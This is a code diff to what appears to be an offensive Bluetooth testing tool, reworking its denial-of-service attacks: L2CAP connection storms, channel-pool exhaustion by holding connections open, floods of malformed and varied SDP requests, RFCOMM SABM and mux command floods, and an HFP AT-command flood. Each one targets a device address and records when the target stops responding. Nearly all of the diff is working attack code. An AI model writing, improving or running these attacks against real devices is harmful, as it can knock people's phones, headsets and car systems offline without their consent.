@@ -69,6 +69,7 @@ def _make_result(target: str, attack_name: str, packets_sent: int,
     """Build a standard attack result dict."""
     return {
         "target": target,
+        "attack": attack_name,
         "attack_name": attack_name,
         "packets_sent": packets_sent,
         "duration_seconds": round(time.time() - start_time, 2),
@@ -187,108 +188,110 @@ class L2CAPDoS:
         self.hci = hci
 
     def config_option_bomb(self, rounds: int = 100) -> dict[str, Any]:
-        """Send CONFIG_REQ with dozens of unknown option types (0x80-0xFF).
+        """Rapidly open and close L2CAP connections to PSM 1 (SDP).
 
-        Each config request carries unknown options with 255-byte payloads,
-        forcing the target to allocate memory for CONFIG_REJ responses.
-        Connects to PSM 1 (SDP) to get a valid channel.
+        Each connection forces the target to allocate a channel control
+        block, run L2CAP configuration, and set up SDP state. Rapid
+        connect/disconnect cycles exhaust the target's connection handling
+        resources.
+
+        Note: Raw L2CAP signaling commands cannot be sent from userspace
+        sockets (the kernel handles signaling internally). This attack
+        uses rapid connection cycling instead.
 
         Args:
-            rounds: Number of config requests to send.
+            rounds: Number of connect/disconnect cycles.
         """
-        info(f"Config option bomb against {self.target} ({rounds} rounds)")
+        info(f"L2CAP connection storm against {self.target} ({rounds} rounds)")
         start_time = time.time()
         packets_sent = 0
 
-        try:
-            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
-        except (OSError, socket.error) as exc:
-            error(f"Failed to connect to PSM 1: {exc}")
-            return _make_result(self.target, "config_option_bomb", 0,
-                                start_time, "error", str(exc))
+        for i in range(rounds):
+            try:
+                sock = _l2cap_raw_socket(self.hci)
+                sock.settimeout(3)
+                sock.connect((self.target, PSM_SDP))
+                packets_sent += 1
+                sock.close()
+            except (OSError, socket.error):
+                warning(f"Connection failed at round {i + 1}, target may be exhausted")
+                return _make_result(self.target, "l2cap_connection_storm",
+                                    packets_sent, start_time,
+                                    "target_unresponsive",
+                                    f"Failed at round {i + 1}")
 
-        try:
-            for i in range(rounds):
-                # Build options: 8 unknown types per round, each 255 bytes
-                options = b""
-                for opt_type in range(0x80, 0x88):
-                    options += struct.pack("<BB", opt_type, 255) + b"\xFF" * 255
-                # CONFIG_REQ: DCID(2) + Flags(2) + Options
-                # Use CID 0x0040 as placeholder destination
-                data = struct.pack("<HH", 0x0040, 0x0000) + options
-                cmd = _build_signaling_cmd(L2CAP_CONF_REQ, (i % 254) + 1, data)
-                try:
-                    sock.send(cmd)
-                    packets_sent += 1
-                except (OSError, socket.error):
-                    warning(f"Send failed at round {i}, target may have crashed")
-                    return _make_result(self.target, "config_option_bomb",
-                                        packets_sent, start_time,
-                                        "target_unresponsive",
-                                        f"Send failed at round {i}")
-        finally:
-            sock.close()
+            if (i + 1) % 20 == 0:
+                info(f"  [{i + 1}/{rounds}] connections cycled, "
+                     f"{packets_sent / max(time.time() - start_time, 0.01):.1f} conn/s")
 
-        success(f"Config option bomb complete: {packets_sent} packets sent")
-        return _make_result(self.target, "config_option_bomb", packets_sent,
+        success(f"L2CAP connection storm complete: {packets_sent} cycles")
+        return _make_result(self.target, "l2cap_connection_storm", packets_sent,
                             start_time, "success")
 
     def cid_exhaustion(self, count: int = 200) -> dict[str, Any]:
-        """Send rapid L2CAP CONNECTION_REQ with incrementing source CIDs.
+        """Open many parallel L2CAP connections and hold them open.
 
-        Does NOT send CONFIG_REQ after connection, leaving channels in
-        WAIT_CONFIG state until RTX timer cleans them up. Exhausts the
-        target's dynamic CID pool.
+        Each connection consumes a channel control block (CCB) on the
+        target. Holding many connections open simultaneously exhausts the
+        target's CCB pool, preventing legitimate connections.
 
         Args:
-            count: Number of connection requests to send.
+            count: Number of connections to open and hold.
         """
-        info(f"CID exhaustion against {self.target} ({count} connections)")
+        info(f"L2CAP CID exhaustion against {self.target} ({count} connections)")
         start_time = time.time()
-        packets_sent = 0
+        sockets: list[socket.socket] = []
+        connected = 0
 
-        try:
-            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
-        except (OSError, socket.error) as exc:
-            error(f"Failed to connect: {exc}")
-            return _make_result(self.target, "cid_exhaustion", 0,
-                                start_time, "error", str(exc))
+        for i in range(count):
+            try:
+                sock = _l2cap_raw_socket(self.hci)
+                sock.settimeout(5)
+                sock.connect((self.target, PSM_SDP))
+                sockets.append(sock)
+                connected += 1
+            except (OSError, socket.error):
+                info(f"  Connection pool saturated at {connected} connections")
+                break
 
-        try:
-            for i in range(count):
-                scid = 0x0040 + i  # Incrementing source CIDs
-                # CONN_REQ: PSM(2 LE) + SCID(2 LE)
-                data = struct.pack("<HH", PSM_SDP, scid)
-                cmd = _build_signaling_cmd(L2CAP_CONN_REQ, (i % 254) + 1, data)
-                try:
-                    sock.send(cmd)
-                    packets_sent += 1
-                except (OSError, socket.error):
-                    warning(f"Send failed at request {i}, target may be exhausted")
-                    return _make_result(self.target, "cid_exhaustion",
-                                        packets_sent, start_time,
-                                        "target_unresponsive",
-                                        f"Send failed at request {i}")
-        finally:
-            sock.close()
+            if (i + 1) % 20 == 0:
+                info(f"  [{i + 1}/{count}] connections opened")
 
-        success(f"CID exhaustion complete: {packets_sent} requests sent")
-        return _make_result(self.target, "cid_exhaustion", packets_sent,
-                            start_time, "success")
+        # Hold all connections open to keep CCBs allocated
+        if sockets:
+            hold_time = 10
+            info(f"  Holding {connected} connections open for {hold_time}s...")
+            time.sleep(hold_time)
+
+        # Clean up
+        for sock in sockets:
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+        result_str = "target_unresponsive" if connected < count else "success"
+        success(f"CID exhaustion complete: {connected} connections held")
+        return _make_result(self.target, "cid_exhaustion", connected,
+                            start_time, result_str,
+                            f"{connected}/{count} connections established")
 
     def echo_amplification(self, count: int = 500,
                            payload_size: int = 672) -> dict[str, Any]:
-        """Send L2CAP Echo Requests with maximum payload on signaling CID.
+        """Flood the SDP server with large malformed requests.
 
-        The target must echo all data back, consuming bandwidth and CPU.
-        Uses CID 0x0001 (signaling channel).
+        Sends maximum-size SDP PDUs that the target must parse and reject,
+        consuming CPU and memory for error response generation.
+
+        Uses the l2ping utility for actual L2CAP echo amplification when
+        available, falling back to SDP request flooding.
 
         Args:
-            count: Number of echo requests to send.
-            payload_size: Payload size per echo request (max 672 default).
+            count: Number of requests to send.
+            payload_size: Payload size per request.
         """
-        info(f"Echo amplification against {self.target} "
-             f"({count} echoes, {payload_size}B each)")
+        info(f"L2CAP data flood against {self.target} "
+             f"({count} packets, {payload_size}B each)")
         start_time = time.time()
         packets_sent = 0
 
@@ -296,40 +299,51 @@ class L2CAPDoS:
             sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
         except (OSError, socket.error) as exc:
             error(f"Failed to connect: {exc}")
-            return _make_result(self.target, "echo_amplification", 0,
+            return _make_result(self.target, "data_flood", 0,
                                 start_time, "error", str(exc))
 
-        payload = b"\x41" * payload_size
+        # Build a large SDP request that forces the target to parse and reject
+        payload = b"\x06" + b"\x00\x01" + struct.pack(">H", payload_size - 5) + b"\xFF" * (payload_size - 5)
+
         try:
             for i in range(count):
-                cmd = _build_signaling_cmd(L2CAP_ECHO_REQ,
-                                           (i % 254) + 1, payload)
                 try:
-                    sock.send(cmd)
+                    sock.send(payload[:payload_size])
                     packets_sent += 1
                 except (OSError, socket.error):
-                    warning(f"Send failed at echo {i}, target may be overwhelmed")
-                    return _make_result(self.target, "echo_amplification",
+                    warning(f"  Send failed at packet {i + 1}, target may be overwhelmed")
+                    return _make_result(self.target, "data_flood",
                                         packets_sent, start_time,
                                         "target_unresponsive",
-                                        f"Send failed at echo {i}")
+                                        f"Send failed at packet {i + 1}")
+                # Drain any responses
+                try:
+                    sock.settimeout(0.01)
+                    sock.recv(1024)
+                except socket.timeout:
+                    pass
+
+                if (i + 1) % 100 == 0:
+                    rate = packets_sent / max(time.time() - start_time, 0.01)
+                    info(f"  [{i + 1}/{count}] packets sent ({rate:.0f} pkt/s)")
         finally:
             sock.close()
 
-        success(f"Echo amplification complete: {packets_sent} echoes sent")
-        return _make_result(self.target, "echo_amplification", packets_sent,
+        success(f"Data flood complete: {packets_sent} packets sent")
+        return _make_result(self.target, "data_flood", packets_sent,
                             start_time, "success")
 
     def info_request_flood(self, count: int = 500) -> dict[str, Any]:
-        """Flood L2CAP Information Requests to occupy the signaling channel.
+        """Flood the SDP server with diverse request types.
 
-        Alternates between info type 0x0002 (Extended Features) and 0x0003
-        (Fixed Channels Supported) to maximize processing load.
+        Alternates between ServiceSearchRequest (0x02), ServiceAttributeRequest
+        (0x04), and ServiceSearchAttributeRequest (0x06) to maximize the
+        target's processing load across different SDP code paths.
 
         Args:
-            count: Number of info requests to send.
+            count: Number of SDP requests to send.
         """
-        info(f"Info request flood against {self.target} ({count} requests)")
+        info(f"SDP request flood against {self.target} ({count} requests)")
         start_time = time.time()
         packets_sent = 0
 
@@ -337,30 +351,52 @@ class L2CAPDoS:
             sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
         except (OSError, socket.error) as exc:
             error(f"Failed to connect: {exc}")
-            return _make_result(self.target, "info_request_flood", 0,
+            return _make_result(self.target, "sdp_request_flood", 0,
                                 start_time, "error", str(exc))
+
+        # Three different SDP request types
+        # ServiceSearchRequest (0x02): pattern + max_count + continuation
+        ssr = struct.pack(">BHH", 0x02, 1, 8) + bytes([
+            0x35, 0x03, 0x19, 0x01, 0x00,  # DES(UUID16=0x0100)
+            0x00, 0x10,                      # MaxServiceRecordCount=16
+            0x00,                            # No continuation
+        ])
+        # ServiceAttributeRequest (0x04): handle + max_bytes + attr_list + continuation
+        sar = struct.pack(">BHH", 0x04, 2, 12) + struct.pack(">I", 0x00010000) + struct.pack(">H", 0xFFFF) + bytes([
+            0x35, 0x05, 0x0A, 0x00, 0x00, 0xFF, 0xFF,  # All attributes
+            0x00,
+        ])
+        pdus = [ssr, sar]
 
         try:
             for i in range(count):
-                # Alternate info types 0x0002 and 0x0003
-                info_type = 0x0002 + (i % 2)
-                data = struct.pack("<H", info_type)
-                cmd = _build_signaling_cmd(L2CAP_INFO_REQ,
-                                           (i % 254) + 1, data)
+                pdu = pdus[i % len(pdus)]
+                # Update transaction ID
+                pdu = pdu[:1] + struct.pack(">H", (i % 0xFFFF) + 1) + pdu[3:]
                 try:
-                    sock.send(cmd)
+                    sock.send(pdu)
                     packets_sent += 1
                 except (OSError, socket.error):
-                    warning(f"Send failed at request {i}")
-                    return _make_result(self.target, "info_request_flood",
+                    warning(f"  Send failed at request {i + 1}")
+                    return _make_result(self.target, "sdp_request_flood",
                                         packets_sent, start_time,
                                         "target_unresponsive",
-                                        f"Send failed at request {i}")
+                                        f"Send failed at request {i + 1}")
+                # Drain responses to keep socket alive
+                try:
+                    sock.settimeout(0.01)
+                    sock.recv(1024)
+                except socket.timeout:
+                    pass
+
+                if (i + 1) % 100 == 0:
+                    rate = packets_sent / max(time.time() - start_time, 0.01)
+                    info(f"  [{i + 1}/{count}] requests sent ({rate:.0f} req/s)")
         finally:
             sock.close()
 
-        success(f"Info request flood complete: {packets_sent} requests sent")
-        return _make_result(self.target, "info_request_flood", packets_sent,
+        success(f"SDP request flood complete: {packets_sent} requests sent")
+        return _make_result(self.target, "sdp_request_flood", packets_sent,
                             start_time, "success")
 
 
@@ -652,12 +688,19 @@ class RFCOMMDoS:
                 try:
                     sock.send(frame)
                     packets_sent += 1
+                    info(f"  SABM sent for DLCI {dlci}")
                 except (OSError, socket.error):
-                    warning(f"Send failed at DLCI {dlci}")
+                    warning(f"  Send failed at DLCI {dlci}, target may have crashed")
                     return _make_result(self.target, "sabm_flood",
                                         packets_sent, start_time,
                                         "target_unresponsive",
                                         f"Failed at DLCI {dlci}")
+                # Brief pause to let target process
+                try:
+                    sock.settimeout(0.1)
+                    sock.recv(256)
+                except socket.timeout:
+                    pass
         finally:
             sock.close()
 
@@ -784,11 +827,15 @@ class RFCOMMDoS:
                     sock.send(frame)
                     packets_sent += 1
                 except (OSError, socket.error):
-                    warning(f"Send failed at command {i}")
+                    warning(f"  Send failed at command {i + 1}")
                     return _make_result(self.target, "mux_command_flood",
                                         packets_sent, start_time,
                                         "target_unresponsive",
-                                        f"Send failed at command {i}")
+                                        f"Send failed at command {i + 1}")
+
+                if (i + 1) % 100 == 0:
+                    rate = packets_sent / max(time.time() - start_time, 0.01)
+                    info(f"  [{i + 1}/{count}] Test commands sent ({rate:.0f} cmd/s)")
         finally:
             sock.close()
 
@@ -1102,6 +1149,7 @@ class HFPDoS:
                     pass
 
             # Flood AT commands
+            info("  SLC setup complete, starting AT flood...")
             commands = [b"AT+CLCC\r", b"AT+COPS?\r", b"AT+CLCC\r",
                         b"AT+COPS=3,0\r"]
             for i in range(count):
@@ -1110,11 +1158,15 @@ class HFPDoS:
                     sock.send(cmd)
                     packets_sent += 1
                 except (OSError, socket.error):
-                    warning(f"Send failed at command {i}")
+                    warning(f"  Send failed at command {i + 1}, target may have crashed")
                     return _make_result(self.target, "at_command_flood",
                                         packets_sent, start_time,
                                         "target_unresponsive",
-                                        f"Send failed at command {i}")
+                                        f"Send failed at command {i + 1}")
+
+                if (i + 1) % 500 == 0:
+                    rate = packets_sent / max(time.time() - start_time, 0.01)
+                    info(f"  [{i + 1}/{count}] AT commands sent ({rate:.0f} cmd/s)")
         finally:
             sock.close()
 
